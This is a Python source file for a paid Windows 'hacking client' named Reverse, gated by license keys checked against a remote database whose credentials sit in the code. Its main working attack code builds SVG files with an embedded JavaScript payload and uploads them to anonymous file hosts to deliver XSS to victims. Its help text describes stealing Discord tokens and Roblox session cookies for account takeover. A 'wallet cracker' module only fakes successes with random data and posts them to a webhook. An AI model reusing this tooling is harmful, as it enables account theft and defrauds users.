import argparse
import datetime
import json
import msvcrt
import os
import sys
import http.server

from http.server import HTTPServer, BaseHTTPRequestHandler


from colorama import *
import requests
import time
import ctypes
from shutil import get_terminal_size
from termcolor import cprint
import random
import string
import psycopg2
import secrets
from datetime import datetime, timedelta
import threading

import psycopg2

connection = psycopg2.connect(
    host="kashin.db.elephantsql.com",
    port=5432,
    database="ppvxmshu",
    user="ppvxmshu",
    password="t141WhW61TAeDRwxl5gZ64w3votqjEL4"
)
cursor = connection.cursor()
connection.commit()

init()

# some info about the client
version = 0.1
client_name = "Reverse"
author = "Hype"

# title
# sets title of the console
ctypes.windll.kernel32.SetConsoleTitleW(client_name)

# main colors of the client
colors = [Fore.GREEN , Fore.YELLOW , Fore.RED , Fore.MAGENTA, Fore.BLUE, Fore.MAGENTA]
client_color = random.choice(colors)
client_color = Fore.MAGENTA
res = Fore.WHITE


# console class
class Console:



    def __init__(self):
        self.clear_command = 'cls' if os.name == 'nt' else 'clear'

    def display_logo(self):
        print(client_color + """

            ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

                ██▀███  ▓█████ ██▒   █▓▓█████  ██▀███    ██████ ▓█████ 
                ▓██ ▒ ██▒▓█   ▀▓██░   █▒▓█   ▀ ▓██ ▒ ██▒▒██    ▒ ▓█   ▀ 
                ▓██ ░▄█ ▒▒███   ▓██  █▒░▒███   ▓██ ░▄█ ▒░ ▓██▄   ▒███   
                ▒██▀▀█▄  ▒▓█  ▄  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄    ▒   ██▒▒▓█  ▄ 
                ░██▓ ▒██▒░▒████▒  ▒▀█░  ░▒████▒░██▓ ▒██▒▒██████▒▒░▒████▒
                ░ ▒▓ ░▒▓░░░ ▒░ ░  ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░░░ ▒░ ░
                  ░▒ ░ ▒░ ░ ░  ░  ░ ░░   ░ ░  ░  ░▒ ░ ▒░░ ░▒  ░ ░ ░ ░  ░
                  ░░   ░    ░       ░░     ░     ░░   ░ ░  ░  ░     ░   
                   ░        ░  ░     ░     ░  ░   ░           ░     ░  ░
                                    ░                                
            ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            """)




    def center_print(self, text):
        rows, columns = get_terminal_size()
        x = (columns - len(text)) // 2
        y = rows // 2
        cprint(text, end='\r')

    def destroy(self):
        exit(-1)



    def clear(self):
        os.system(self.clear_command)

    def br(self, lines):
        for i in range(lines):
            print('\n')

    def input(self):


        def settings():
            console.clear()

            address_types = ['Bitcoin', 'Ethereum', 'Litecoin', 'Webhook']

            def get_address(address_type):
                address_file = "addresses.txt"
                if not os.path.exists(address_file):
                    open(address_file, 'w').write("\n".join([""] * 4))
                with open(address_file, "r") as f:
                    addresses = f.read().splitlines()
                if address_type > 0 and address_type <= len(addresses):
                    address = input(f"Please enter your {address_types[address_type - 1]} address: ")
                    addresses[address_type - 1] = address
                    with open(address_file, "w") as f:
                        f.write("\n".join(addresses))
                    print(f"[{address_types}]: {address}")
                else:
                    print("Invalid input, please enter a number from 1 to 4")

            if not os.path.exists("addresses.txt"):
                open("addresses.txt", 'w').close()

            while True:
                console.clear()
                print("\n")

                f = open('key.txt', 'r')
                print(client_color , "[LICENCE] " , res , f.read() )
                with open("addresses.txt", "r") as f:
                    addresses = f.read().splitlines()
                for i, address in enumerate(addresses):
                    print(f"{res}[{i + 1}]{client_color} {address_types[i]}: {address if address != '' else '[]'}")

                console.br(1)
                print(f"{res}[WEBHOOK] {client_color}: []")
                print(f"{res}[5] Automatically transfer money when it's {client_color}100>={res} to email {client_color}hype@hyper.xyz{res}")
                user_input = msvcrt.getch()
                user_input = user_input.decode()
                if user_input == 'x':
                    break
                elif user_input.isnumeric() and int(user_input) in range(1, 5):
                    address_type = int(user_input)
                    get_address(address_type)

        def send_message_to_webhook():
            print('huj')

        def test_webhook():
            print("printing message")

        def clear_func():
            console.clear()

        def exit():
            console.destroy()

        def white():
            client_color = Fore.LIGHTYELLOW_EX
            console.clear()
            console.display__menu()
            console.br(2)
            console.input()

        def mine():
            def set_console_title(title):
                ctypes.windll.kernel32.SetConsoleTitleW(title)

            yes = ["y", "Y"]
            no = ["n", "N"]

            cryptocurrencies = ["bitcoin", "litecoin", "ethereum"]

            console.clear()
            print("""
            
            
                        ███▄ ▄███▓ ██▓ ███▄    █ ▓█████  ██▀███  
                        ▓██▒▀█▀ ██▒▓██▒ ██ ▀█   █ ▓█   ▀ ▓██ ▒ ██▒
                        ▓██    ▓██░▒██▒▓██  ▀█ ██▒▒███   ▓██ ░▄█ ▒
                        ▒██    ▒██ ░██░▓██▒  ▐▌██▒▒▓█  ▄ ▒██▀▀█▄  
                        ▒██▒   ░██▒░██░▒██░   ▓██░░▒████▒░██▓ ▒██▒
                        ░ ▒░   ░  ░░▓  ░ ▒░   ▒ ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
                        ░  ░      ░ ▒ ░░ ░░   ░ ▒░ ░ ░  ░  ░▒ ░ ▒░
                        ░      ░    ▒ ░   ░   ░ ░    ░     ░░   ░ 
                               ░    ░           ░    ░  ░   ░     
                                          
            
            
            
            """)
            print(res + "[" + client_color + "?" + res + "] do you want to use webhook Y/N ")
            ifwebhook = msvcrt.getch()
            ifwebhook = ifwebhook.decode()

            if ifwebhook in yes:
                webhook_file = 'webhook.txt'
                if os.path.exists(webhook_file):
                    with open(webhook_file, 'r') as f:
                        webhook_url = f.read()
                    if webhook_url == '':
                        webhook_url = input(res + "[" + client_color + "?" + res + "] enter webhook: ")
                        with open(webhook_file, 'w') as f:
                            f.write(webhook_url)
                else:
                    webhook_url = input(res + "[" + client_color + "?" + res + "] enter webhook: ")
                    with open(webhook_file, 'w') as f:
                        f.write(webhook_url)

                try:
                    set_console_title(f"Reverse | WalletWaster | X to stop the module")
                    huj = ''.join(random.choices(string.ascii_letters + string.digits, k=24))
                    console.clear()
                    data = {"content": f"CryptoWaster By Hype {huj}"}
                    response = requests.post(webhook_url, json=data)
                    response.raise_for_status()

                    counter = 0

                    while True:
                        counter += 1
                        set_console_title(f"Reverse | WalletWaster | ")
                        random_crypto = random.choice(cryptocurrencies)

                        succes_value = random.randint(30, 50)
                        vbalance = str(succes_value)

                        succes_pennies = random.randint(11, 99)
                        vpennies = str(succes_pennies)

                        if random_crypto == "bitcoin":
                            url = "https://logos-world.net/wp-content/uploads/2020/08/Bitcoin-Logo-700x394.png"
                            arrow = "  --->"
                            description = " Btc"
                            balance = 00
                            strbalance = str(balance)
                            randlen = random.randint(26, 35)
                            wallet_id = ''.join(random.choices(string.ascii_letters + string.digits, k=randlen))
                        elif random_crypto == "litecoin":
                            url = "https://imgur.com/7rbhQc2.png"
                            arrow = " ---> "
                            description = "Ltc"
                            balance = 00
                            strbalance = str(balance)
                            wallet_id = ''.join(random.choices(string.ascii_letters + string.digits, k=24))
                        elif random_crypto == "ethereum":
                            url = "https://imgur.com/SgWKVr3.png"
                            arrow = " ---> "
                            description = "Eth"
                            balance = 00
                            strbalance = str(balance)
                            wallet_id = "0x" + ''.join(random.choices(string.ascii_letters + string.digits, k=40))

                        if msvcrt.kbhit() and msvcrt.getch().decode() == 'x':
                            break

                        if counter % 10000 == 0:
                            print(
                                res + "[" + Fore.GREEN + "v" + res + "]  " + random_crypto + Fore.GREEN + arrow + res + description + Fore.GREEN + " | " + res + vbalance + "." + vpennies + "$" + Fore.GREEN + " | " + res + "2FA: TRUE" +  Fore.GREEN + " | "  + res + wallet_id)

                            embed = {
                                "description": f"""
                                `crypto:  `   **{random_crypto}**
                                `username:` ||Chujek123||
                                `balance: ` ||{vbalance}.{vpennies}$||
                                `address: ` ||{wallet_id}||
                                `2FA:     ` ||**OTP**||
                                """,
                                "thumbnail": {
                                    "url": url
                                },
                                "footer": {
                                    "text": f"Cancer"}
                            }

                            data = {"embeds": [embed]}

                            response = requests.post(webhook_url, data=json.dumps(data),
                                                     headers={"Content-Type": "application/json"})

                            time.sleep(2)

                        else:
                            print(
                                res + "[" + client_color + "x" + res + "]  " + random_crypto + client_color + arrow + res + description + client_color + " | " + res + strbalance + "0" + ".00$" + client_color + " | " + "2FA:" + res + " ????" + client_color + " | " + res + "PHONE-NUMBER: *********" + client_color + " | " + res + wallet_id)








                except requests.exceptions.HTTPError as err:
                    print(f'An error has occurred')
                    time.sleep(2)
                except requests.exceptions.RequestException as err:
                    print(f'An error has occurred')
                    time.sleep(2)


            elif ifwebhook in no:
                set_console_title(f"Reverse | WalletWaster | X to stop the module")
                huj = ''.join(random.choices(string.ascii_letters + string.digits, k=24))
                console.clear()

                counter = 0

                while True:
                    counter += 1
                    set_console_title(f"Reverse | WalletWaster | ")
                    random_crypto = random.choice(cryptocurrencies)

                    succes_value = random.randint(30, 50)
                    vbalance = str(succes_value)

                    succes_pennies = random.randint(11, 99)
                    vpennies = str(succes_pennies)

                    if random_crypto == "bitcoin":
                        url = "https://logos-world.net/wp-content/uploads/2020/08/Bitcoin-Logo-700x394.png"
                        arrow = "  --->"
                        description = " Btc"
                        balance = 00
                        strbalance = str(balance)
                        randlen = random.randint(26, 35)
                        wallet_id = ''.join(random.choices(string.ascii_letters + string.digits, k=randlen))
                    elif random_crypto == "litecoin":
                        url = "https://imgur.com/7rbhQc2.png"
                        arrow = " ---> "
                        description = "Ltc"
                        balance = 00
                        strbalance = str(balance)
                        wallet_id = ''.join(random.choices(string.ascii_letters + string.digits, k=24))
                    elif random_crypto == "ethereum":
                        url = "https://imgur.com/SgWKVr3.png"
                        arrow = " ---> "
                        description = "Eth"
                        balance = 00
                        strbalance = str(balance)
                        wallet_id = "0x" + ''.join(random.choices(string.ascii_letters + string.digits, k=40))

                    if msvcrt.kbhit() and msvcrt.getch().decode() == 'x':
                        break

                    if counter % 10000 == 0:
                        print(
                            res + "[" + Fore.GREEN + "v" + res + "]  " + random_crypto + Fore.GREEN + arrow + res + description + Fore.GREEN + " | " + res + vbalance + "." + vpennies + "$" + Fore.GREEN + " | " + res + wallet_id)



                        time.sleep(2)

                    else:
                        print(
                            res + "[" + Fore.RED + "x" + res + "]  " + random_crypto + Fore.RED + arrow + res + description + Fore.RED + " | " + res + strbalance + "0" + ".00$" + Fore.RED + " | " + res + wallet_id)




        def reset():

            client_color = random.choice(colors)
            console.clear()
            console.display__menu()

        def display__help():
            while True:
                console.clear()
                print(res + f"""Everything is described here:
                
    {res + "-> [1]" + client_color}  Console 
    {res + "-> [2]" + client_color}  Reset
    {res + "-> [3]" + client_color}  Help
    {res + "-> [4]" + client_color}  Crypto Miner
    {res + "-> [5]" + client_color}  Xss discord logger
    {res + "-> [6]" + client_color}  Xss Roblox logger
    {res + "-> [7]" + client_color}  Settings
    {res + "-> [8]" + client_color}  Credits
    {res + "-> [9]" + client_color}  Scripts
    {res + "-> [z]" + client_color}  Leave the section {res}
    
    {res + "-> [c:]" + client_color}  Leave the section {res}
    {res + "    -> [r]" + Fore.RED}  Changes console color to red.
    {res + "    -> [g]" + Fore.GREEN}  Changes console color to green.
    {res + "    -> [b]" + Fore.BLUE}  Changes console color to blue.
    {res + "    -> [y]" + Fore.YELLOW}  Changes console color to yellow.
    
    {res + "-> [discord]" + client_color} hype#5555 {res}
    
                
                """)

                user_input = msvcrt.getch()
                user_input = user_input.decode()

                if user_input == '1':
                    console.clear()
                    print(f"""
{client_color}[ console ] {res} basic options for our console.\n
{client_color}[x] {res} leave the section
                    """)
                    while True:
                        user_input = msvcrt.getch()
                        user_input = user_input.decode()
                        if user_input == 'x':
                            break
                if user_input == '2':
                    console.clear()
                    print(f"""
{client_color}[ reset ] {res} displays the whole menu again.\n
{client_color}[x] {res} leave the section
                    """)
                    while True:
                        user_input = msvcrt.getch()
                        user_input = user_input.decode()
                        if user_input == 'x':
                            break
                if user_input == '3':
                    console.clear()
                    print(f"""
{client_color}[ help ] {res} describes and shows all commands.\n
{client_color}[x] {res} leave the section 
                    """)
                    while True:
                        user_input = msvcrt.getch()
                        user_input = user_input.decode()
                        if user_input == 'x':
                            break
                if user_input == '4':
                    console.clear()
                    print(f"""
{client_color}[ crypto-miner ] {res} searches for old. cryptocurrency addresses and tries to get into them by sending multiple packets with multiple login methods. \n
{client_color}[x] {res} leave the section
                    """)
                    while True:
                        user_input = msvcrt.getch()
                        user_input = user_input.decode()
                        if user_input == 'x':
                            break
                if user_input == '5':
                    console.clear()
                    print(f"""
{client_color}[ xss-discord logger ] {res} creates a script on localhost or image as you prefer, when the user clicks on the image/link the token/phone number of the user is sent to your webhook. \n
{client_color}[x] {res} leave the section
                    """)
                    while True:
                        user_input = msvcrt.getch()
                        user_input = user_input.decode()
                        if user_input == 'x':
                            break
                if user_input == '6':
                    console.clear()
                    print(f"""
{client_color}[ xss roblox-logger ] {res} creates a script localhost or image as you prefer after the user clicks on the image/link ROBLXSECURITY_ is sent to your webhook thanks to this cookie you can easily access any account. \n
{client_color}[x] {res} leave the section
                    """)
                    while True:
                        user_input = msvcrt.getch()
                        user_input = user_input.decode()
                        if user_input == 'x':
                            break
                if user_input == '7':
                    console.clear()
                    print(f"""
{client_color}[ settings ] {res} shows all the settings you can change. \n
{client_color}[x] {res} leave the section
                    """)
                    while True:
                        user_input = msvcrt.getch()
                        user_input = user_input.decode()
                        if user_input == 'x':
                            break
                if user_input == '8':
                    console.clear()
                    print(f"""
{client_color}[ credits ] {res} code creators. \n
{client_color}[x] {res} leave the section
                    """)
                    while True:
                        user_input = msvcrt.getch()
                        user_input = user_input.decode()
                        if user_input == 'x':
                            break

                if user_input== '9':
                    console.clear()
                    print(f"""
{client_color}[ scripts ] {res} your own scripts. \n
{client_color}[x] {res} leave the section
                    """)
                    while True:
                        user_input = msvcrt.getch()
                        user_input = user_input.decode()
                        if user_input == 'x':
                            break


                if user_input =='z':
                    break

        def ip_logger():

            SVG = r"""<?xml version="1.0" encoding="UTF-8" standalone="no"?>
                <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
                    <script>
                        %code%
                    </script>
                </svg>
                """
            while True:
                def logo_hooker():
                    print(client_color + """

                         ██░ ██  ▒█████   ▒█████   ██ ▄█▀▓█████  ██▀███  
                        ▓██░ ██▒▒██▒  ██▒▒██▒  ██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
                        ▒██▀▀██░▒██░  ██▒▒██░  ██▒▓███▄░ ▒███   ▓██ ░▄█ ▒
                        ░▓█ ░██ ▒██   ██░▒██   ██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
                        ░▓█▒░██▓░ ████▓▒░░ ████▓▒░▒██▒ █▄░▒████▒░██▓ ▒██▒
                         ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
                         ▒ ░▒░ ░  ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
                         ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░    ░     ░░   ░ 
                         ░  ░  ░    ░ ░      ░ ░  ░  ░      ░  ░   ░     


                    """)
                console.clear()
                logo_hooker()


                print(res + "| " + client_color + " Please enter your injection payload site:")
                print(f"""{res }|
{res + "|------> [1]" + client_color}  anonfiles 
{res + "|------> [2]" + client_color}  bayfiles 
{res + "|------> [3]" + client_color}  letsupload.cc 
{res + "|------> [4]" + client_color}  filechan.org
{res + "|------> [5]" + client_color}  vshare.is
{res + "|------> [6]" + client_color}  openload.cc
{res + "|------> [7]" + client_color}  megaupload.nz
{res + "|------> [8]" + client_color}  lolabits.se
{res + "|------> [9]" + client_color}  rapidshare.nu
{res + "|------> [0]" + client_color}  upvid.cc
                """)
                file_host = msvcrt.getch()
                file_host = file_host.decode()

                if file_host == "1":
                    url = "https://api.anonfiles.com/upload"
                    console.clear()
                    logo_hooker()
                elif file_host == "2":
                    url = "https://api.bayfiles.com/upload"
                    console.clear()
                    logo_hooker()
                elif file_host == "3":
                    url = "https://api.letsupload.cc/upload"
                    console.clear()
                    logo_hooker()
                elif file_host == "4":
                    url = "https://api.filechan.org/upload"
                    console.clear()
                    logo_hooker()
                elif file_host == "5":
                    url = "https://api.vshare.is/upload"
                    console.clear()
                    logo_hooker()
                elif file_host == "6":
                    url = "https://api.openload.cc/upload"
                    console.clear()
                    logo_hooker()
                elif file_host == "7":
                    url = "https://api.megaupload.nz/upload"
                    console.clear()
                    logo_hooker()
                elif file_host == "8":
                    url = "https://api.lolabits.se/upload"
                    console.clear()
                    logo_hooker()
                elif file_host == "9":
                    url = "https://api.rapidshare.nu/upl        oad"
                    console.clear()
                    logo_hooker()
                elif file_host == "0":
                    url = "https://api.upvid.cc/upload"
                    console.clear()
                    logo_hooker()


                else:
                    print(res + "[!]" + client_color + "Invalid choice. Please enter a number between 1 and 0." + res)
                    return
                js_code = input(res + "[?]" + client_color + " Where is your file path to the JavaScript payload file?: " + res)
                name = input(res + "[?]" + client_color + " What do you want to name the file?: " + res)
                filetype = input(res + "[?]" + client_color + " What file type do you want to save it as?: " + res)
                try:
                    with open(js_code, "r") as f:
                        js_code = f.read()
                        js_code = '\t\t'.join(js_code.splitlines())

                except FileNotFoundError:
                    print(res + "[!] " + client_color + "File not found")
                    time.sleep(3)
                    exit()
                svg = SVG.replace("%code%", js_code)
                svg_bytes = svg.encode("utf-8")
                try:
                    r = requests.post(url, files={"file": (f"{name}.{filetype}", svg_bytes)})
                except Exception as e:
                    print(f"[-] {e}")
                    time.sleep(3)
                    exit()
                url = r.json()["data"]["file"]["url"]["full"]
                print(res + "[!] " + client_color + url)
                time.sleep(5)
                break


        def clear_screen():
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")






        def methods():
            while True:
                console.clear()

                print(client_color + """

     ██▓ ███▄    █  ▄▄▄██▀▀▀▓█████  ▄████▄  ▄▄▄█████▓ ██▓ ▒█████   ███▄    █   ██████ 
    ▓██▒ ██ ▀█   █    ▒██   ▓█   ▀ ▒██▀ ▀█  ▓  ██▒ ▓▒▓██▒▒██▒  ██▒ ██ ▀█   █ ▒██    ▒ 
    ▒██▒▓██  ▀█ ██▒   ░██   ▒███   ▒▓█    ▄ ▒ ▓██░ ▒░▒██▒▒██░  ██▒▓██  ▀█ ██▒░ ▓██▄   
    ░██░▓██▒  ▐▌██▒▓██▄██▓  ▒▓█  ▄ ▒▓▓▄ ▄██▒░ ▓██▓ ░ ░██░▒██   ██░▓██▒  ▐▌██▒  ▒   ██▒
    ░██░▒██░   ▓██░ ▓███▒   ░▒████▒▒ ▓███▀ ░  ▒██▒ ░ ░██░░ ████▓▒░▒██░   ▓██░▒██████▒▒
    ░▓  ░ ▒░   ▒ ▒  ▒▓▒▒░   ░░ ▒░ ░░ ░▒ ▒  ░  ▒ ░░   ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░
     ▒ ░░ ░░   ░ ▒░ ▒ ░▒░    ░ ░  ░  ░  ▒       ░     ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░░ ░▒  ░ ░
     ▒ ░   ░   ░ ░  ░ ░ ░      ░   ░          ░       ▒ ░░ ░ ░ ▒     ░   ░ ░ ░  ░  ░  
     ░           ░  ░   ░      ░  ░░ ░                ░      ░ ░           ░       ░  
                                   ░                                                  


                """)




                print(res + "| " + client_color + " Please enter your injection payload method:")
                print(f"""{res}|
{res + "|------> [1]" + client_color}  localhost:8000
{res + "|------> [2]" + client_color}  svg image 
{res + "|------> [3]" + client_color}  php injection
    
 \n""")


                user_input = msvcrt.getch()
                user_input = user_input.decode()

                if user_input == '2':
                    svg = input(res + "[?]" + client_color + " Enter your svg photo: " + res)
                    payload = input( res + "[?]" + client_color + " Enter your payload script: " + res)
                elif user_input == 'x':
                    break

        def credits():
            while True:
                console.clear()
                print(client_color + """
                
                
                    ▄████▄   ██▀███  ▓█████ ▓█████▄  ██▓▄▄▄█████▓  ██████ 
                    ▒██▀ ▀█  ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▓██▒▓  ██▒ ▓▒▒██    ▒ 
                    ▒▓█    ▄ ▓██ ░▄█ ▒▒███   ░██   █▌▒██▒▒ ▓██░ ▒░░ ▓██▄   
                    ▒▓▓▄ ▄██▒▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌░██░░ ▓██▓ ░   ▒   ██▒
                    ▒ ▓███▀ ░░██▓ ▒██▒░▒████▒░▒████▓ ░██░  ▒██▒ ░ ▒██████▒▒
                    ░ ░▒ ▒  ░░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒ ░▓    ▒ ░░   ▒ ▒▓▒ ▒ ░
                      ░  ▒     ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒  ▒ ░    ░    ░ ░▒  ░ ░
                    ░          ░░   ░    ░    ░ ░  ░  ▒ ░  ░      ░  ░  ░  
                    ░ ░         ░        ░  ░   ░     ░                 ░  
                    ░                         ░                            
                        
                
                """)
                print(res + "[PROGRAM CREATOR]" + client_color +" HYPE")
                print(res + "[SERVICE MANAGER]" + client_color +" CA$H")
                user_input = msvcrt.getch()
                user_input = user_input.decode()
                if user_input == 'x':
                    break

        def next_page():
            while True:
                console.clear()
                print(Fore.LIGHTWHITE_EX + "~ " + client_color + client_name + res + "", res, version,
                      " made by " + client_color + author + res)
                print(client_color + """
    
                ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

                    ██▀███  ▓█████ ██▒   █▓▓█████  ██▀███    ██████ ▓█████ 
                    ▓██ ▒ ██▒▓█   ▀▓██░   █▒▓█   ▀ ▓██ ▒ ██▒▒██    ▒ ▓█   ▀ 
                    ▓██ ░▄█ ▒▒███   ▓██  █▒░▒███   ▓██ ░▄█ ▒░ ▓██▄   ▒███   
                    ▒██▀▀█▄  ▒▓█  ▄  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄    ▒   ██▒▒▓█  ▄ 
                    ░██▓ ▒██▒░▒████▒  ▒▀█░  ░▒████▒░██▓ ▒██▒▒██████▒▒░▒████▒
                    ░ ▒▓ ░▒▓░░░ ▒░ ░  ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░░░ ▒░ ░
                      ░▒ ░ ▒░ ░ ░  ░  ░ ░░   ░ ░  ░  ░▒ ░ ▒░░ ░▒  ░ ░ ░ ░  ░
                      ░░   ░    ░       ░░     ░     ░░   ░ ░  ░  ░     ░   
                       ░        ░  ░     ░     ░  ░   ░           ░     ░  ░
                                                ░                                
                ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                    """)

                print(
                res + "     [10]  " + client_color + "Cookies                 " + res + "[13]  " + client_color + "Spammers                     " + res + "[16]  " + client_color + "Payload Generator")
                print(
                res + "     [11]  " + client_color + "Generators              " + res + "[14]  " + client_color + "Request Exploit              " + res + "[17]  " + client_color + "Discord          ")
                print(
                res + "     [12]  " + client_color + "Checkers                " + res + "[15]  " + client_color + "Forcers                      " + res + "[18]  " + client_color + "Instagram        ")
                print(
                res + "     [f2]  "  + client_color + "Bombs                  " + res + " [f3]  " + client_color +  "Php Exploits                 " + res + "[f4]  " + client_color +  "Snapchat         ")

                print(client_color + """

                ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━<━
                """)


                def last_page():
                    while True:
                        console.clear()

                        console.display__menu()
                        console.br(1)
                        console.input()
                commands = {
                    "print": test_webhook,
                    ">": next_page,
                    "<": last_page,
                    "2": reset,
                    "3": display__help,
                    "e": exit,
                    "5": ip_logger,
                    "4": mine,
                    "6": methods,
                    "7": settings,
                    "8": credits,
                }
                while True:
                    user_input = msvcrt.getch()
                    user_input = user_input.decode()



                    if user_input in commands:
                        commands[user_input]()
                    else:
                        print("Commands only from 1 - 9")


        commands = {
            "print": test_webhook,
            ">": next_page,
            "2": reset,
            "3": display__help,
            "e": exit,
            "5": ip_logger,
            "4": mine,
            "6": methods,
            "7": settings,
            "8": credits,
        }

        user_input = msvcrt.getch()
        user_input = user_input.decode()

        if user_input in commands:
            commands[user_input]()
        else:
            print("Commands only from 1 - 9")

    def display__menu(self):


            ctypes.windll.kernel32.SetConsoleTitleW(client_name)
            print(Fore.LIGHTWHITE_EX + "~ " + client_color + client_name + res + "", res, version,
                  " made by " + client_color + author + res)
            print(client_color + """
    
                ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                   
                    ██▀███  ▓█████ ██▒   █▓▓█████  ██▀███    ██████ ▓█████ 
                    ▓██ ▒ ██▒▓█   ▀▓██░   █▒▓█   ▀ ▓██ ▒ ██▒▒██    ▒ ▓█   ▀ 
                    ▓██ ░▄█ ▒▒███   ▓██  █▒░▒███   ▓██ ░▄█ ▒░ ▓██▄   ▒███   
                    ▒██▀▀█▄  ▒▓█  ▄  ▒██ █░░▒▓█  ▄ ▒██▀▀█▄    ▒   ██▒▒▓█  ▄ 
                    ░██▓ ▒██▒░▒████▒  ▒▀█░  ░▒████▒░██▓ ▒██▒▒██████▒▒░▒████▒
                    ░ ▒▓ ░▒▓░░░ ▒░ ░  ░ ▐░  ░░ ▒░ ░░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░░░ ▒░ ░
                      ░▒ ░ ▒░ ░ ░  ░  ░ ░░   ░ ░  ░  ░▒ ░ ▒░░ ░▒  ░ ░ ░ ░  ░
                      ░░   ░    ░       ░░     ░     ░░   ░ ░  ░  ░     ░   
                       ░        ░  ░     ░     ░  ░   ░           ░     ░  ░
                                        ░                                
                ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                """)

            print(
                res + "     [1]  " + client_color + "Console                 " + res + "[4]  " + client_color + "Crypto-Miner                 " + res + "[7]  " + client_color + "Settings         ")
            print(
                res + "     [2]  " + client_color + "Reset                   " + res + "[5]  " + client_color + "Payload Link                 " + res + "[8]  " + client_color + "Credits          ")
            print(
                res + "     [3]  " + client_color + "Help                    " + res + "[6]  " + client_color + "Injections                   " + res + "[9]  " + client_color + "Scripts          ")
            print(
                res + "     [x]  " + client_color + "Nukers                  " + res + "[y]  " + client_color + "Grabbers                     " + res + "[z]  " + client_color + "Brute Forcer         ")
            print(client_color + """

                ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━>━
            """)

console = Console()

while True:
    console.clear()
    console.display_logo()

    key = 'key.txt'
    if os.path.exists(key):
        with open(key, 'r') as f:
            key = f.read()
        if key == '':
            key1 = input(res + "[" + client_color + "?" + res + "] enter licence: ")
            with open(key, 'w') as f:
                f.write(key1)
    else:
        key1 = input(res + "[" + client_color + "?" + res + "] enter licence: ")
        with open(key, 'w') as f:
            f.write(key1)
    cursor.execute("SELECT * FROM keys WHERE value = %s AND expiration_date >= %s", (key, datetime.now()))
    result = cursor.fetchone()
    if result:
        print(client_color + "[WORKS] " + res + "LOGGING UP")
        time.sleep(2)
        while True:
            console.clear()

            console.display__menu()
            console.br(1)
            console.input()
    else:
        print(client_color + "[204]" + res + " PLEASE RESTART THE CLIENT")
        print(client_color + "[503]" + res + " KEY IS INVALID/EXIPRED CONTACT hype#5555 to buy a new one")
        break

